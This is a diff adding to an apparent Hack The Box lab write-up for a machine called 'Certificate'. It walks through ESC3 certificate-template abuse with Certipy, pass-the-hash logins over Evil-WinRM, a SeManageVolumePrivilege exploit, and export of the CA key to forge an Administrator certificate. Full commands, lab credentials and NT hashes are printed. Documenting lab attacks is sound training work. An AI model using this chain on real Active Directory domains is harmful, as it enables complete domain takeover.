@@ -388,7 +388,7 @@ Obtained `user.txt`
 957beb3b7fbbf5f61***************
 ```
 
-## Shell as Ryan.K
+## Shell as `Ryan.K`
 
 ### BloodHound
 
@@ -511,6 +511,278 @@ Certificate Templates
     [!] Vulnerabilities
       ESC3                              : 'CERTIFICATE.HTB\\Domain CRA Managers' can enroll and template has Certificate Request Agent EKU set
 ```
+
+
+### ESC3 Vulnerability
+
+[This misconfiguration](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) allowed the attacker to request certificates on behalf of other users, including higher-privileged accounts. By abusing this functionality, it became possible to request a certificate for a privileged user and then authenticate as that user using certificate-based authentication.
+
+First, I need to request certificate for user `Lion.SK`.
+```python
+certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.129.232.96' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 36
+[*] Got certificate with UPN 'Lion.SK@certificate.htb'
+[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
+[*] Saved certificate and private key to 'lion.sk.pfx'
+```
+
+Unfortunately, we can't request because email not available
+
+
+```python
+certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.129.232.96' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\administrator'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[-] Got error while trying to request certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
+[*] Request ID is 39
+Would you like to save the private key? (y/N) y
+[*] Saved private key to 39.key
+[-] Failed to request certificate
+
+```
+
+As you can see, Administrator has no email, I need to find the user who has more privileges to get Administrator access
+
+```python
+*Evil-WinRM* PS C:\Users\Ryan.K\Documents> get-aduser -filter * -properties * | select SamAccountName, mail
+
+SamAccountName mail
+-------------- ----
+Administrator
+Guest
+krbtgt
+Kai.X          kai.x@certificate.htb
+Sara.B         sara.b@certificate.htb
+John.C         john.c@certificate.htb
+Aya.W          aya.w@certificate.htb
+Nya.S          nya.s@certificate.htb
+Maya.K         maya.k@certificate.htb
+Lion.SK        lion.sk@certificate.htb
+Eva.F          eva.f@certificate.htb
+Ryan.K         ryan.k@certificate.htb
+akeder.kh
+kara.m
+Alex.D         alex.d@certificate.htb
+karol.s
+saad.m         saad.m@certificate.htb
+xamppuser
+
+```
+
+
+I checked `BloodHound` and found interesting user `Ryan.K`
+
+
+
+<img width="1109" height="589" alt="7" src="https://github.com/user-attachments/assets/8706978f-f7ca-4483-bd8b-b4002502bf4e" />
+
+
+`Ryan.K` is the member of `Domain Storage Manage`, which maybe can gives us `Write/Full Control` right to system files
+
+
+I successfully requested `Ryan.K` certificate 
+
+```python
+certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QAZ2wsx" -dc-ip '10.129.232.96' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 37
+[*] Got certificate with UPN 'ryan.k@certificate.htb'
+[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
+[*] Saved certificate and private key to 'ryan.k.pfx'
+```
+
+Now I can request the user `TGT`
+```python
+certipy auth -pfx ryan.k.pfx -dc-ip '10.129.232.96' 
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: ryan.k@certificate.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'ryan.k.ccache'
+[*] Trying to retrieve NT hash for 'ryan.k'
+[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
+```
+
+
+We got shell as `Ryan.K`
+
+```python
+evil-winrm -i 10.129.232.96 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6  
+                                        
+Evil-WinRM shell v3.7
+                                                                                
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.K\Documents>
+```
+
+
+## Privilege Escalation
+
+
+First, I checked what privilege our user has
+
+```python
+*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                      State
+============================= ================================ =======
+SeMachineAccountPrivilege     Add workstations to domain       Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
+SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
+```
+
+`SeManageVolumePrivilege` looks interesting here.I found [exploit](https://github.com/CsEnox/SeManageVolumeExploit) which grant us full permissions on `C:\` drive
+
+```python
+*Evil-WinRM* PS C:\Users\Ryan.K\Documents> .\SeManageVolumeExploit.exe
+Entries changed: 858
+
+DONE
+```
+
+But I can't get `root.txt` file
+
+```python
+*Evil-WinRM* PS C:\Users\Ryan.K\Documents> type C:\Users\Administrator\Desktop\root.txt
+Access is denied
+At line:1 char:1
++ type C:\Users\Administrator\Desktop\root.txt
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\Desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+```
+
+
+This file is encrypted
+
+
+```python
+cipher /c root.txt
+
+ Listing C:\users\administrator\desktop\
+ New files added to this directory will be encrypted.
+
+E root.txt
+  Compatibility Level:
+    Windows Vista/Server 2008
+
+cipher.exe : Access is denied.
+    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+Access is denied.  Key information cannot be retrieved.
+
+Access is denied
+```
+
+It's too complicated to decrypt this file, so I'll try different way to PrivEsc
+
+
+
+### Golden Certificate
+
+
+First, I need `serial number` of `Certificate-LTD-CA`, then I need to get certification
+
+```python
+
+*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX 75b2f4bbf31f108945147b466131bdca .\ca.pfx
+MY "Personal"
+================ Certificate 3 ================
+Serial Number: 75b2f4bbf31f108945147b466131bdca
+Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+ NotBefore: 11/3/2024 2:55 PM
+ NotAfter: 11/3/2034 3:05 PM
+Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
+Certificate Template Name (Certificate Type): CA
+CA Version: V0.0
+Signature matches Public Key
+Root Certificate: Subject matches Issuer
+Template: CA, Root Certification Authority
+Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
+  Key Container = Certificate-LTD-CA
+  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
+  Provider = Microsoft Software Key Storage Provider
+Signature test passed
+Enter new password for output file .\ca.pfx:
+Enter new password:
+Confirm new password:
+CertUtil: -exportPFX command completed successfully.
+```
+
+I downloaded this `ca.pfx` and forgering `administrator certification`
+
+```python
+certipy forge -ca-pfx ca.pfx -upn Administrator@certificate.htb -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Saved forged certificate and private key to 'administrator_forged.pfx'
+```
+
+Now I got administrator certification and now we can request TGT 
+
+```python
+certipy auth -pfx administrator_forged.pfx -dc-ip 10.129.232.96
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@certificate.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
+```
+
+
+## Shell as `Administrator`
+
+```python
+
+evil-winrm -i 10.129.232.96 -u Administrator -H d804304519bf0143c14cbf1c024408c6
+                                        
+Evil-WinRM shell v3.7
+                                                       
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                           
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+
+```
+
+Obtained `root.txt`
+
+```python
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+01c25bad0ee1bb6b2***************
+```
+
+
+
+# Conclusion
+
+This box highlighted the severe impact of AD CS misconfigurations combined with excessive domain privileges. Membership in the Domain Storage Managers group provided backup rights that allowed extraction of the CA private key, leading to a successful Golden Certificate attack. With control over the CA, arbitrary user certificates could be forged, enabling credential-less authentication and decryption of EFS-protected files. This demonstrates that compromising a Certification Authority results in complete and persistent domain compromise.
+
+
+
+
+
+
+
+
+
+
 
 
 
